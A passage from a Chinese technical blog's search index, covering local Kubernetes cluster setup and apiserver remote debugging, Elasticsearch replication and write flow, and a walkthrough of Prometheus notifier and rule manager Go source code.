&amp; SCHEDULER_PID=$!&#125;function start_kubedns &#123; if [[ \"$&#123;ENABLE_CLUSTER_DNS&#125;\" = true ]]; then cp \"$&#123;KUBE_ROOT&#125;/cluster/addons/dns/kube-dns.yaml.in\" kube-dns.yaml sed -i -e \"s/&#123;&#123; pillar\\['dns_domain'\\] &#125;&#125;/$&#123;DNS_DOMAIN&#125;/g\" kube-dns.yaml sed -i -e \"s/&#123;&#123; pillar\\['dns_server'\\] &#125;&#125;/$&#123;DNS_SERVER_IP&#125;/g\" kube-dns.yaml # TODO update to dns role once we have one. # use kubectl to create kubedns addon $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" --namespace=kube-system create -f kube-dns.yaml echo \"Kube-dns addon successfully deployed.\" rm kube-dns.yaml fi&#125;function start_kubedashboard &#123; if [[ \"$&#123;ENABLE_CLUSTER_DASHBOARD&#125;\" = true ]]; then echo \"Creating kubernetes-dashboard\" # use kubectl to create the dashboard $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-secret.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-configmap.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-rbac.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-controller.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-service.yaml echo \"kubernetes-dashboard deployment and service successfully deployed.\" fi&#125;function create_psp_policy &#123; echo \"Create podsecuritypolicy policies for RBAC.\" $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/policies.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/roles.yaml $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/bindings.yaml&#125;function create_storage_class &#123; if [ -z \"$CLOUD_PROVIDER\" ]; then CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/local/default.yaml else CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/$&#123;CLOUD_PROVIDER&#125;/default.yaml fi if [ -e $CLASS_FILE ]; then echo \"Create default storage class for $CLOUD_PROVIDER\" $&#123;KUBECTL&#125; --kubeconfig=\"$&#123;CERT_DIR&#125;/admin.kubeconfig\" create -f $CLASS_FILE else echo \"No storage class available for $CLOUD_PROVIDER.\" fi&#125;function print_success &#123;if [[ \"$&#123;START_MODE&#125;\" != \"kubeletonly\" ]]; then if [[ \"$&#123;ENABLE_DAEMON&#125;\" = false ]]; then echo \"Local Kubernetes cluster is running. Press Ctrl-C to shut it down.\" else echo \"Local Kubernetes cluster is running.\" fi cat &lt;&lt;EOFLogs: $&#123;APISERVER_LOG:-&#125; $&#123;CTLRMGR_LOG:-&#125; $&#123;CLOUD_CTLRMGR_LOG:-&#125; $&#123;PROXY_LOG:-&#125; $&#123;SCHEDULER_LOG:-&#125;EOFfiif [[ \"$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;\" = true ]]; then echo \" $&#123;APISERVER_BASIC_AUDIT_LOG&#125;\"fiif [[ \"$&#123;START_MODE&#125;\" == \"all\" ]]; then echo \" $&#123;KUBELET_LOG&#125;\"elif [[ \"$&#123;START_MODE&#125;\" == \"nokubelet\" ]]; then echo echo \"No kubelet was started because you set START_MODE=nokubelet\" echo \"Run this script again with START_MODE=kubeletonly to run a kubelet\"fiif [[ \"$&#123;START_MODE&#125;\" != \"kubeletonly\" ]]; then echo if [[ \"$&#123;ENABLE_DAEMON&#125;\" = false ]]; then echo \"To start using your cluster, you can open up another terminal/tab and run:\" else echo \"To start using your cluster, run:\" fi cat &lt;&lt;EOF export KUBECONFIG=$&#123;CERT_DIR&#125;/admin.kubeconfig cluster/kubectl.shAlternatively, you can write to the default kubeconfig: export KUBERNETES_PROVIDER=local cluster/kubectl.sh config set-cluster local --server=https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125; --certificate-authority=$&#123;ROOT_CA_FILE&#125; cluster/kubectl.sh config set-credentials myself $&#123;AUTH_ARGS&#125; cluster/kubectl.sh config set-context local --cluster=local --user=myself cluster/kubectl.sh config use-context local cluster/kubectl.shEOFelse cat &lt;&lt;EOFThe kubelet was started.Logs: $&#123;KUBELET_LOG&#125;EOFfi&#125;# If we are running in the CI, we need a few more things before we can startif [[ \"$&#123;KUBETEST_IN_DOCKER:-&#125;\" == \"true\" ]]; then echo \"Preparing to test ...\" $&#123;KUBE_ROOT&#125;/hack/install-etcd.sh export PATH=\"$&#123;KUBE_ROOT&#125;/third_party/etcd:$&#123;PATH&#125;\" KUBE_FASTBUILD=true make ginkgo cross apt install -y sudofi# validate that etcd is: not running, in path, and has minimum required version.if [[ \"$&#123;START_MODE&#125;\" != \"kubeletonly\" ]]; then kube::etcd::validatefiif [ \"$&#123;CONTAINER_RUNTIME&#125;\" == \"docker\" ] &amp;&amp; ! kube::util::ensure_docker_daemon_connectivity; then exit 1fiif [[ \"$&#123;CONTAINER_RUNTIME&#125;\" == \"rkt\" ]]; then test_rktfiif [[ \"$&#123;START_MODE&#125;\" != \"kubeletonly\" ]]; then test_apiserver_offfikube::util::test_openssl_installedkube::util::ensure-cfssl### IF the user didn't supply an output/ for the build... Then we detect.if [ \"$GO_OUT\" == \"\" ]; then detect_binaryfiecho \"Detected host and ready to start services. Doing some housekeeping first...\"echo \"Using GO_OUT $GO_OUT\"KUBELET_CIDFILE=/tmp/kubelet.cidif [[ \"$&#123;ENABLE_DAEMON&#125;\" = false ]]; then trap cleanup EXITfiecho \"Starting services now!\"if [[ \"$&#123;START_MODE&#125;\" != \"kubeletonly\" ]]; then start_etcd set_service_accounts start_apiserver start_controller_manager if [[ \"$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;\" == \"true\" ]]; then start_cloud_controller_manager fi start_kubeproxy start_kubedns start_kubedashboardfiif [[ \"$&#123;START_MODE&#125;\" != \"nokubelet\" ]]; then ## TODO remove this check if/when kubelet is supported on darwin # Detect the OS name/arch and display appropriate error. case \"$(uname -s)\" in Darwin) warning \"kubelet is not currently supported in darwin, kubelet aborted.\" KUBELET_LOG=\"\" ;; Linux) start_kubelet ;; *) warning \"Unsupported host OS. Must be Linux or Mac OS X, kubelet aborted.\" ;; esacfiif [[ -n \"$&#123;PSP_ADMISSION&#125;\" &amp;&amp; \"$&#123;AUTHORIZATION_MODE&#125;\" = *RBAC* ]]; then create_psp_policyfiif [[ \"$DEFAULT_STORAGE_CLASS\" = \"true\" ]]; then create_storage_classfiprint_successif [[ \"$&#123;ENABLE_DAEMON&#125;\" = false ]]; then while true; do sleep 1; donefiif [[ \"$&#123;KUBETEST_IN_DOCKER:-&#125;\" == \"true\" ]]; then cluster/kubectl.sh config set-cluster local --server=https://localhost:6443 --certificate-authority=/var/run/kubernetes/server-ca.crt cluster/kubectl.sh config set-credentials myself --client-key=/var/run/kubernetes/client-admin.key --client-certificate=/var/run/kubernetes/client-admin.crt cluster/kubectl.sh config set-context local --cluster=local --user=myself cluster/kubectl.sh config use-context localfi 执行过程中如果有kubelet启动失败的问题； 1failed to run Kubelet: failed to create kubelet: misconfiguration: kubelet c 解决方案: 12345678910[root@server02 ~]# docker info...Server Version: 1.13.1Storage Driver: overlay2 Backing Filesystem: xfs Supports d_type: true Native Overlay Diff: trueLogging Driver: journaldCgroup Driver: systemd... 1234567891011121314151617181920212223# 修改docker.servicevi /lib/systemd/system/docker.service找到--exec-opt native.cgroupdriver=systemd \\修改为：--exec-opt native.cgroupdriver=cgroupfs \\# 重启dockersystemctl daemon-reloadsystemctl restart docker# 修改后查看docker Cgroup Driver[root@server03 sysconfig]# docker info...Server Version: 1.13.1Storage Driver: overlay2 Backing Filesystem: xfs Supports d_type: true Native Overlay Diff: trueLogging Driver: journaldCgroup Driver: cgroupfs... 继续： 单机集群： 12#第一次执行下面的命令编译并启动集群./hack/local-up-cluster.sh 1make GOGCFLAGS=\"-N -l\" WHAT=\"cmd/kube-apiserver\" # 假设只编译kube-apiserver这一个模块，需要单独编译，这个命令不管用，不考虑了吧~~ 直接执行跳过编译： 1./hack/local-up-cluster.sh -O 检查kube启动正常 1ps -ef|grep kube|grep -v grep 以apiserver为例子 12kill -15 5228dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /root/gopath/src/k8s.io/kubernetes/_output/bin/kube-apiserver -- --authorization-mode=Node,RBAC --runtime-config=settings.k8s.io/v1alpha1 --cloud-provider= --cloud-config= --v=3 --vmodule= --cert-dir=/var/run/kubernetes --client-ca-file=/var/run/kubernetes/client-ca.crt --service-account-key-file=/tmp/kube-serviceaccount.key --service-account-lookup=true --enable-admission-plugins=LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection --disable-admission-plugins= --admission-control-config-file= --bind-address=0.0.0.0 --secure-port=6443 --tls-cert-file=/var/run/kubernetes/serving-kube-apiserver.crt --tls-private-key-file=/var/run/kubernetes/serving-kube-apiserver.key --insecure-bind-address=127.0.0.1 --insecure-port=8080 --storage-backend=etcd3 --etcd-servers=http://127.0.0.1:2379 --service-cluster-ip-range=10.0.0.0/24 --feature-gates=AllAlpha=false --external-hostname=localhost --requestheader-username-headers=X-Remote-User --requestheader-group-headers=X-Remote-Group --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-client-ca-file=/var/run/kubernetes/request-header-ca.crt --requestheader-allowed-names=system:auth-proxy --proxy-client-cert-file=/var/run/kubernetes/client-auth-proxy.crt --proxy-client-key-file=/var/run/kubernetes/client-auth-proxy.key --cors-allowed-origins='/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$' 执行apiserver 远程端口：39999 防火墙放开： 12firewall-cmd --zone=public --add-port=39999/tcp --permanentfirewall-cmd --reload 远程调试坑： 如果要调试如kube-apiserver程序则需要重新编译增加编译参数 1go build -o _output/bin/kube-apiserver -gcflags=\"-N -l\" cmd/kube-apiserver/apiserver.go 否则无法监听 1export GO_OUT=/go/src/k8s.io/kubernetes/_output/bin goland配置： Run-&gt;edit configuration配置。 断点调试。 这样远程同步完代码就可以远程调试了。 开始源码分析之路~~。","categories":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/categories/k8s/"}],"tags":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/tags/k8s/"}]},{"title":"ES过程分析","slug":"es过程分析","date":"2020-02-26T12:51:46.449Z","updated":"2020-02-26T12:50:21.000Z","comments":true,"path":"2020/02/26/es过程分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/26/es%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/","excerpt":"","text":"ES过程分析选主算法Bully算法 他假设所有节点都有一个唯一的ID，使用该ID对节点进行排序。任何时候的当前Leader都是集群的最高ID节点。ES通过推迟选举，知道当前的Master失效来解决这个问题，只要当前节点不挂掉，就不重新选主。但容易出现脑裂，为此，再通过得票人数过半来解决脑裂问题。 Paxos算法 数据副本策略分片副本采用主从模式。多副本中存在一个主副本Primary和多个从副本Secondary。所有写入操作都写入到主副本，当主副本出错的时候，系统从其他的从副本中选择合适的副本作为新的副本。 数据写入流程： 1）写请求进入主副本节点，节点为该操作分配SN，使用该SN创建UpdateRequest结构。然后将该UpdateRequest插入自己的PrepareList 2）主副本节点将携带SN的UpdateRequest发往从副本节点，从节点收到后同样插入PrepareList，完成后给主副本节点回复一个ACK 3）一旦主副本节点收到所有从副本节点的相应，确定该数据已经被正确写入到所有的从副本节点，此时认为可以提交了，将此UpdateRequest放入到commited list， commited list向前移动。 4）主副本节点回复客户端更新成功完成。对每个prepare消息，主副本节点向从副本节点发送一个commit通知，告诉他们自己的commited point位置，从副本节点收到通知后根据指示移动commited point到相同的位置。 基本读取模型1）读请求转发到相关分片。注意，因为大多数搜索都会发送到一个或者多个索引，通常需要从多个分片中读取。每个分片都保存这些数据的一部分。 2）从副本组中选择一个相关分片的活跃副本，它可以是主分片或副分片。默认情况下，ES会简单地循环遍历这些分片 3）发送分片级的读请求到被选中的副本 4）合并结果并给客户端返回响应，注意，针对通过ID查找的get请求，会跳过这个步骤，因为只有一个相关的分片。 Index基本流程新建，索引和删除请求都是写操作。写操作必须先在主分片执行成功后才能复制到相关的副分片。写单个文档的流程。 1）客户端向NODE1发送写请求 2）NODE1使用文档ID来确定文档属于分片0，通过集群状态中的内容路由表信息来获知分片0的主分片位于NODE3，因此请求被转发到NODE3上 3）NODE3上的主分片执行写操作，如果写入成功，则它将请求并行转发到NODE1和NODE2的副分片上，等待返回结果。当所有的副分片都报告成功，NODE3将向协调节点报告成功，协调节点再想客户端报告成功。 quorum = int( (primary+number_of_replicas)/2)+1 协调节点流程协调节点负责创建索引，转发请求到主分片节点，等待响应，回复客户端。 1）参数检查 2）处理pipeline请求 3）自动创建索引 4）对请求的预先处理 5）检测集群状态 6）内容路由，构建基于shared的请求 7）路由算法 8）转发请求并等待响应 主分片节点流程主节点所在节点负责在本地写主分片，写成功后，转发写副分片请求，等待响应，回复协调节点。 1）检查请求 2）是否延迟执行 3）判断主分片是否已经发生迁移 4）检查写一致性 5）写Lucene和事务日志 6）flush translog 7）写副分片 8）处理副分片写失败情况","categories":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"http://www.yorzorzy.xyz/categories/ElasticSearch/"}],"tags":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"http://www.yorzorzy.xyz/tags/ElasticSearch/"}]},{"title":"Prometheus 架构和源码学习","slug":"prometheus原理介绍","date":"2020-02-18T01:29:10.643Z","updated":"2020-02-18T01:29:10.643Z","comments":true,"path":"2020/02/18/prometheus原理介绍/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/18/prometheus%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"Prometheus 架构和源码Prometheus架构 构成部分prometheus源码分析（prometheus基于版本2.1.0和alertmanager版本0.8.0）： notifier ruleManager queryengine web discovermanager scrapeManager localstorage/remotestorage alertManager pushgateway 各个组件的构成结构图： Notifiernotifier 组件用于告警通知，在完成初始化后，notifier组件内部会构建一个告警通知队列，队列的大小由命令行参数–alertmanager.notification-queue-capacity确定，默认值为10000 ，且告警信息通过sendAlerts方法发送给AlertManager 。 初始化notifier组件： 1notifier = notifier.New(&amp;cfg.notifier, log.With(logger, \"component\", \"notifier\")) notifier将规则触发的告警信息AlertManagers服务组的过程，通知管理服务由发现AlertManager服务，注册notifier和notifier服务组成。 发现alertManager服务（discoveryManagerScrape）的逻辑与发现scrape服务（discoveryManagerNotify）的逻辑是一样的， 如果将alertmanager组件结合，那么服务发现的类型就是static_configs 初始化的过程中会完成对rulemanager和notifier组件的构造，同时notifier会通过sendAlerts向ruleManager回调注册。 启动notifier服务： 1.构建notifier结构实列 2.加载系统配置 3.启动notifier notifier服务结构： 12345678910111213141516// Notifier is responsible for dispatching alert notifications to an// alert manager service.type Notifier struct &#123; queue []*Alert opts *Options metrics *alertMetrics more chan struct&#123;&#125; mtx sync.RWMutex ctx context.Context cancel func() alertmanagers map[string]*alertmanagerSet logger log.Logger&#125; notifier实列使用New方法来实现，处理逻辑： QueueCapacity的大小构建告警信息缓存队列，QueueCapacity的大小使用命令行启动参数–alertmanager.notification-queue-capacity指定 context协同控制notifier服务 注册notifier服务指标：告警缓存队列大小，告警信息长度，告警地址个书，丢弃的告警信息个数 1234567891011121314151617181920212223242526272829303132// New constructs a new Notifier.func New(o *Options, logger log.Logger) *Notifier &#123; ctx, cancel := context.WithCancel(context.Background()) if o.Do == nil &#123; o.Do = ctxhttp.Do &#125; if logger == nil &#123; logger = log.NewNopLogger() &#125; n := &amp;Notifier&#123; queue: make([]*Alert, 0, o.QueueCapacity), ctx: ctx, cancel: cancel, more: make(chan struct&#123;&#125;, 1), opts: o, logger: logger, &#125; queueLenFunc := func() float64 &#123; return float64(n.queueLen()) &#125; alertmanagersDiscoveredFunc := func() float64 &#123; return float64(len(n.Alertmanagers())) &#125; n.metrics = newAlertMetrics( o.Registerer, o.QueueCapacity, queueLenFunc, alertmanagersDiscoveredFunc, ) return n&#125; newAlertMetrics是将notifier服务指标注册到prometheus系统的具体实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566func newAlertMetrics(r prometheus.Registerer, queueCap int, queueLen, alertmanagersDiscovered func() float64) *alertMetrics &#123; m := &amp;alertMetrics&#123; latency: prometheus.NewSummaryVec(prometheus.SummaryOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"latency_seconds\", Help: \"Latency quantiles for sending alert notifications (not including dropped notifications).\", &#125;, []string&#123;alertmanagerLabel&#125;, ), errors: prometheus.NewCounterVec(prometheus.CounterOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"errors_total\", Help: \"Total number of errors sending alert notifications.\", &#125;, []string&#123;alertmanagerLabel&#125;, ), sent: prometheus.NewCounterVec(prometheus.CounterOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"sent_total\", Help: \"Total number of alerts successfully sent.\", &#125;, []string&#123;alertmanagerLabel&#125;, ), dropped: prometheus.NewCounter(prometheus.CounterOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"dropped_total\", Help: \"Total number of alerts dropped due to errors when sending to Alertmanager.\", &#125;), queueLength: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"queue_length\", Help: \"The number of alert notifications in the queue.\", &#125;, queueLen), queueCapacity: prometheus.NewGauge(prometheus.GaugeOpts&#123; Namespace: namespace, Subsystem: subsystem, Name: \"queue_capacity\", Help: \"The capacity of the alert notifications queue.\", &#125;), alertmanagersDiscovered: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123; Name: \"prometheus_notifications_alertmanagers_discovered\", Help: \"The number of alertmanagers discovered and active.\", &#125;, alertmanagersDiscovered), &#125; m.queueCapacity.Set(float64(queueCap)) if r != nil &#123; r.MustRegister( m.latency, m.errors, m.sent, m.dropped, m.queueLength, m.queueCapacity, m.alertmanagersDiscovered, ) &#125; return m&#125; 加载服务配置： 加载系统的配置过程，notifier服务会从prometheus.yml中获取external_labels, alert_relabel_configs和告警服务配置信息，将其保存到alertmanager中，告警触发的时候，根据external_labels,alert_relabel_configs的规则添加，重置对应的label，更具告警服务信息完成告警的信息发送。 12345678910111213141516171819202122232425262728293031// ApplyConfig updates the status state as the new config requires.func (n *Notifier) ApplyConfig(conf *config.Config) error &#123; n.mtx.Lock() defer n.mtx.Unlock() n.opts.ExternalLabels = conf.GlobalConfig.ExternalLabels n.opts.RelabelConfigs = conf.AlertingConfig.AlertRelabelConfigs amSets := make(map[string]*alertmanagerSet) for _, cfg := range conf.AlertingConfig.AlertmanagerConfigs &#123; ams, err := newAlertmanagerSet(cfg, n.logger) if err != nil &#123; return err &#125; ams.metrics = n.metrics // The config hash is used for the map lookup identifier. b, err := json.Marshal(cfg) if err != nil &#123; return err &#125; amSets[fmt.Sprintf(\"%x\", md5.Sum(b))] = ams &#125; n.alertmanagers = amSets return nil&#125; newAlertmanagerSet方法会根据告警服务的配置信息构建alertmanagerSet结构实列，告警服务对应的ams还是初始化空列表 123456789101112// alertmanagerSet contains a set of Alertmanagers discovered via a group of service// discovery definitions that have a common configuration on how alerts should be sent.type alertmanagerSet struct &#123; cfg *config.AlertmanagerConfig client *http.Client metrics *alertMetrics mtx sync.RWMutex ams []alertmanager logger log.Logger&#125; 初始化函数： 123456789101112func newAlertmanagerSet(cfg *config.AlertmanagerConfig, logger log.Logger) (*alertmanagerSet, error) &#123; client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, \"alertmanager\") if err != nil &#123; return nil, err &#125; s := &amp;alertmanagerSet&#123; client: client, cfg: cfg, logger: logger, &#125; return s, nil&#125; 启动notifier服务： 12345678910111213141516171819202122// Run dispatches notifications continuously.func (n *Notifier) Run(tsets &lt;-chan map[string][]*targetgroup.Group) &#123; for &#123; select &#123; case &lt;-n.ctx.Done(): return case ts := &lt;-tsets: n.reload(ts) case &lt;-n.more: &#125; alerts := n.nextBatch() if !n.sendAll(alerts...) &#123; n.metrics.dropped.Add(float64(len(alerts))) &#125; // If the queue still has items left, kick off the next iteration. if n.queueLen() &gt; 0 &#123; n.setMore() &#125; &#125;&#125; 服务收到更新信号调用reload方法，将告警服务ts放入reload方法中，更新服务目标服务信息。 scrape发现服务以job_name为单元，notifier发现服务以告警服务为单元，告警服务作用域所有的job_name. 12345678910111213func (n *Notifier) reload(tgs map[string][]*targetgroup.Group) &#123; n.mtx.Lock() defer n.mtx.Unlock() for id, tgroup := range tgs &#123; am, ok := n.alertmanagers[id] if !ok &#123; level.Error(n.logger).Log(\"msg\", \"couldn't sync alert manager set\", \"err\", fmt.Sprintf(\"invalid id:%v\", id)) continue &#125; am.sync(tgroup) &#125;&#125; 调用sync方法，同步告警服务信息 1234567891011121314151617181920212223242526272829303132333435// sync extracts a deduplicated set of Alertmanager endpoints from a list// of target groups definitions.func (s *alertmanagerSet) sync(tgs []*targetgroup.Group) &#123; all := []alertmanager&#123;&#125; for _, tg := range tgs &#123; ams, err := alertmanagerFromGroup(tg, s.cfg) if err != nil &#123; level.Error(s.logger).Log(\"msg\", \"Creating discovered Alertmanagers failed\", \"err\", err) continue &#125; all = append(all, ams...) &#125; s.mtx.Lock() defer s.mtx.Unlock() // Set new Alertmanagers and deduplicate them along their unique URL. s.ams = []alertmanager&#123;&#125; seen := map[string]struct&#123;&#125;&#123;&#125; for _, am := range all &#123; us := am.url().String() if _, ok := seen[us]; ok &#123; continue &#125; // This will initialise the Counters for the AM to 0. s.metrics.sent.WithLabelValues(us) s.metrics.errors.WithLabelValues(us) //根据URL地址构建唯一键值， seen[us] = struct&#123;&#125;&#123;&#125; //保存alertmanager s.ams = append(s.ams, am) &#125;&#125; alertmanagerFromGroup 方法中将对告警信息的label 进行整理，包括address, alerts_path 和 scheme，每个实列的内容都为告警服务的URL地址。 sendAll方法，发送告警到所有配置的alertmanagers，当至少一个alertmanager成功，返回成功。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// sendAll sends the alerts to all configured Alertmanagers concurrently.// It returns true if the alerts could be sent successfully to at least one Alertmanager.func (n *Notifier) sendAll(alerts ...*Alert) bool &#123; begin := time.Now() b, err := json.Marshal(alerts) if err != nil &#123; level.Error(n.logger).Log(\"msg\", \"Encoding alerts failed\", \"err\", err) return false &#125; n.mtx.RLock() amSets := n.alertmanagers n.mtx.RUnlock() var ( wg sync.WaitGroup numSuccess uint64 ) for _, ams := range amSets &#123; ams.mtx.RLock() for _, am := range ams.ams &#123; wg.Add(1) ctx, cancel := context.WithTimeout(n.ctx, ams.cfg.Timeout) defer cancel() go func(ams *alertmanagerSet, am alertmanager) &#123; u := am.url().String() if err := n.sendOne(ctx, ams.client, u, b); err != nil &#123; level.Error(n.logger).Log(\"alertmanager\", u, \"count\", len(alerts), \"msg\", \"Error sending alert\", \"err\", err) n.metrics.errors.WithLabelValues(u).Inc() &#125; else &#123; atomic.AddUint64(&amp;numSuccess, 1) &#125; n.metrics.latency.WithLabelValues(u).Observe(time.Since(begin).Seconds()) n.metrics.sent.WithLabelValues(u).Add(float64(len(alerts))) wg.Done() &#125;(ams, am) &#125; ams.mtx.RUnlock() &#125; //发送告警同步等待 wg.Wait() return numSuccess &gt; 0&#125; 使用sendOne发送告警信息，使用http请求的方式发送告警信息 123456789101112131415161718func (n *Notifier) sendOne(ctx context.Context, c *http.Client, url string, b []byte) error &#123; req, err := http.NewRequest(\"POST\", url, bytes.NewReader(b)) if err != nil &#123; return err &#125; req.Header.Set(\"Content-Type\", contentTypeJSON) resp, err := n.opts.Do(ctx, c, req) if err != nil &#123; return err &#125; defer resp.Body.Close() // Any HTTP status 2xx is OK. if resp.StatusCode/100 != 2 &#123; return fmt.Errorf(\"bad response status %v\", resp.Status) &#125; return err&#125; notifier流程： 注册notifier: 初始化过程中将notifier服务注册到rulemanager中，规则运算过程中触发告警，会调用注册的sendAlerts方法完成告警信息发送。 告警状态分为三种：StateInactive（告警活动状态），StatePending (告警待定状态)，StateFiring(告警激活状态)。 1234567891011121314151617181920212223242526272829// sendAlerts implements a the rules.NotifyFunc for a Notifier.// It filters any non-firing alerts from the input.func sendAlerts(n *notifier.Notifier, externalURL string) rules.NotifyFunc &#123; return func(ctx context.Context, expr string, alerts ...*rules.Alert) error &#123; var res []*notifier.Alert for _, alert := range alerts &#123; // Only send actually firing alerts. if alert.State == rules.StatePending &#123; continue &#125; a := &amp;notifier.Alert&#123; StartsAt: alert.FiredAt, Labels: alert.Labels, Annotations: alert.Annotations, GeneratorURL: externalURL + strutil.TableLinkForExpression(expr), &#125; if !alert.ResolvedAt.IsZero() &#123; a.EndsAt = alert.ResolvedAt &#125; res = append(res, a) &#125; if len(alerts) &gt; 0 &#123; n.Send(res...) &#125; return nil &#125;&#125; 告警信息alerts通过notifier.Send方法添加到告警队列中，在添加之前需要对告警信息的label进行扩展和重置。 12345678910111213141516171819202122232425262728293031323334353637383940414243// Send queues the given notification requests for processing.// Panics if called on a handler that is not running.func (n *Notifier) Send(alerts ...*Alert) &#123; n.mtx.Lock() defer n.mtx.Unlock() // Attach external labels before relabelling and sending. for _, a := range alerts &#123; lb := labels.NewBuilder(a.Labels) for ln, lv := range n.opts.ExternalLabels &#123; if a.Labels.Get(string(ln)) == \"\" &#123; lb.Set(string(ln), string(lv)) &#125; &#125; a.Labels = lb.Labels() &#125; alerts = n.relabelAlerts(alerts) // Queue capacity should be significantly larger than a single alert // batch could be. if d := len(alerts) - n.opts.QueueCapacity; d &gt; 0 &#123; alerts = alerts[d:] level.Warn(n.logger).Log(\"msg\", \"Alert batch larger than queue capacity, dropping alerts\", \"num_dropped\", d) n.metrics.dropped.Add(float64(d)) &#125; // If the queue is full, remove the oldest alerts in favor // of newer ones. if d := (len(n.queue) + len(alerts)) - n.opts.QueueCapacity; d &gt; 0 &#123; n.queue = n.queue[d:] level.Warn(n.logger).Log(\"msg\", \"Alert notification queue full, dropping alerts\", \"num_dropped\", d) n.metrics.dropped.Add(float64(d)) &#125; n.queue = append(n.queue, alerts...) // Notify sending goroutine that there are alerts to be processed. n.setMore()&#125; 主要的流程图： RuleManagerruleManager在prometheus初始化阶段调用rules.NewManager方法完成构建，ruleManager为Manager类型： 123456789// The Manager manages recording and alerting rules.type Manager struct &#123; opts *ManagerOptions groups map[string]*Group mtx sync.RWMutex block chan struct&#123;&#125; logger log.Logger&#125; groups为map[string]*Group类型，key为规则组名，Group为具体的规则信息。 Group结构定义如下： 12345678910111213141516// Group is a set of rules that have a logical relation.type Group struct &#123; name string file string interval time.Duration rules []Rule seriesInPreviousEval []map[string]labels.Labels // One per Rule. opts *ManagerOptions evaluationTime time.Duration mtx sync.Mutex done chan struct&#123;&#125; terminated chan struct&#123;&#125; logger log.Logger&#125; 更新规则： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// Update the rule manager's state as the config requires. If// loading the new rules failed the old rule set is restored.func (m *Manager) Update(interval time.Duration, files []string) error &#123; m.mtx.Lock() defer m.mtx.Unlock() // To be replaced with a configurable per-group interval. groups, errs := m.loadGroups(interval, files...) if errs != nil &#123; for _, e := range errs &#123; level.Error(m.logger).Log(\"msg\", \"loading groups failed\", \"err\", e) &#125; return errors.New(\"error loading rules, previous rule set restored\") &#125; var wg sync.WaitGroup for _, newg := range groups &#123; wg.Add(1) // If there is an old group with the same identifier, stop it and wait for // it to finish the current iteration. Then copy it into the new group. gn := groupKey(newg.name, newg.file) oldg, ok := m.groups[gn] delete(m.groups, gn) go func(newg *Group) &#123; if ok &#123; oldg.stop() newg.copyState(oldg) &#125; go func() &#123; // Wait with starting evaluation until the rule manager // is told to run. This is necessary to avoid running // queries against a bootstrapping storage. &lt;-m.block newg.run(m.opts.Context) &#125;() wg.Done() &#125;(newg) &#125; // Stop remaining old groups. for _, oldg := range m.groups &#123; oldg.stop() &#125; wg.Wait() m.groups = groups return nil&#125; 规则组状态复制Group.copyState指从源规则组中，将与目标规则组相同规则名称下的指标赋值给对应的目标规则，将源规则组处于活跃状态下的指标赋值到目标规则组的活跃区域。 12345678910111213141516171819202122232425262728293031323334353637// copyState copies the alerting rule and staleness related state from the given group.//// Rules are matched based on their name. If there are duplicates, the// first is matched with the first, second with the second etc.func (g *Group) copyState(from *Group) &#123; g.evaluationTime = from.evaluationTime ruleMap := make(map[string][]int, len(from.rules)) for fi, fromRule := range from.rules &#123; l, _ := ruleMap[fromRule.Name()] ruleMap[fromRule.Name()] = append(l, fi) &#125; for i, rule := range g.rules &#123; indexes, _ := ruleMap[rule.Name()] if len(indexes) == 0 &#123; continue &#125; fi := indexes[0] 